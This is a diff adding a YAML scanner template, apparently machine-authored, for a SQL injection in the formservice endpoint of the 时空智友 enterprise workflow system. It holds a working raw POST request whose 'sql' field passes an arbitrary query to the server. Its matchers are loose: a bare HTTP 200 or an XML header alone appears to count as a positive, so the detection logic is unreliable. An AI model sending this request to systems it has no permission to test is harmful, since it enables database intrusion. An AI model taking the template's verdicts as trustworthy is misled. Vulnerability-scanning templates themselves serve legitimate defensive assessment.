@@ -1,0 +1,30 @@
+id: poc-yaml-shi-kong-zhi-you-formservice-sql
+info:
+  name: 时空智友企业流程化管控系统-formservice-SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: sql-injection
+
+variables:
+  v1: '{{rand_int(10000, 100000)}}'
+  v2: '{{rand_int(1000, 10000)}}'
+
+http:
+  - raw:
+      - |
+        POST /formservice?service=workflow.sqlResult HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"params": {"a": "1"}, "sql": "select {{v1}}-{{v2}}"}
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body, "<?xml version=\"1.0\" encoding=\"utf-8\"?>")
+          - contains(body, "<root>") && contains(body, to_string(to_number(v1) - to_number(v2)))
+      - type: word
+        words:
+          - "<errmsg>ORA-00923: 未找到要求的 FROM 关键字"
+        part: body
